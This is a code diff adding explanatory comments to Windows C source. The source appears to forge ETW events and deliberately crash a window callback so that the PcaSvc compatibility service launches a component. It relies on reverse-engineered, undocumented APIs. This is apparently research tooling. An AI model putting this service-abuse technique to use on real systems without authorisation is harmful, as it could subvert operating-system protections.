@@ -42,7 +42,8 @@ EVENT_DESCRIPTOR MessageBoxEvent = {
 
 /* PcaMonitorProcess pointer prototype. Returns standard system error code
 * PcaSvc needs to be running. It can be started by the INTERACTIVE users.
-* This function will start it for us if it's stopped, so no need to worry about that */
+* This function will start it for us if it's stopped, so no need to worry about that
+* Taken & names guessed from reverse-engineering & behavioral analysis */
 typedef DWORD(WINAPI* PcaMonitorProcessPtr)(
 	HANDLE hProcess, // handle to process to be monitored
 	int unknown0, // always set to 1
@@ -51,6 +52,8 @@ typedef DWORD(WINAPI* PcaMonitorProcessPtr)(
 	PWSTR workingDir, // working directory of program to be monitored, no trailing backslash
 	ULONG flags // set of flags to modify monitoring behavior
 );
+/* Writes an event's information without registering its provider
+   Definition taken from Geoff Chappell's website */
 typedef ULONG(WINAPI* EtwEventWriteNoRegistrationPtr)(
 	LPGUID providerId,
 	PEVENT_DESCRIPTOR eventDescriptor,
@@ -69,12 +72,14 @@ int BiTriggerMain(
 	if (!EtwEventWriteNoRegistration)
 		return EXIT_FAILURE;
 
+	// write an event that PcaSvc will catch that indicates a version message box has been detected
 	win32Status = EtwEventWriteNoRegistration(&AE_LOG, &MessageBoxEvent,
 		3, &AE_EVENT_DESCRIPTOR);
 	if (win32Status != ERROR_SUCCESS)
 		return win32Status;
 
 	MessageBoxEvent.Id = 0x1F48;
+	// write an event that PcaSvc will catch that indicates a message box with an error icon has been detected
 	win32Status = EtwEventWriteNoRegistration(&AE_LOG, &MessageBoxEvent,
 		3, &AE_EVENT_DESCRIPTOR);
 
@@ -89,7 +94,7 @@ LRESULT CALLBACK BiWndClassTriggerProc(
 )
 {
 	if (msg == WM_WINDOWPOSCHANGING) {
-		__ud2();
+		__ud2(); // cause an exception in a user callback. PcaSvc will detect this and attempt to launch the DM.
 	}
 	return DefWindowProcW(hWnd, msg, wParam, lParam);
 }
@@ -164,7 +169,7 @@ int wmain(
 	IRegisteredTask* wdiTask = NULL;
 	TASK_STATE taskState;
 	HMODULE pcaModule = NULL;
-	PcaMonitorProcessPtr PcaMonitorProcess = NULL; //fixme; 4703 for some reason...
+	PcaMonitorProcessPtr PcaMonitorProcess = NULL; //fixme; 4703 without initialization for some reason...
 	DWORD curDirSize;
 	PWSTR curDir;
 	LSTATUS status;
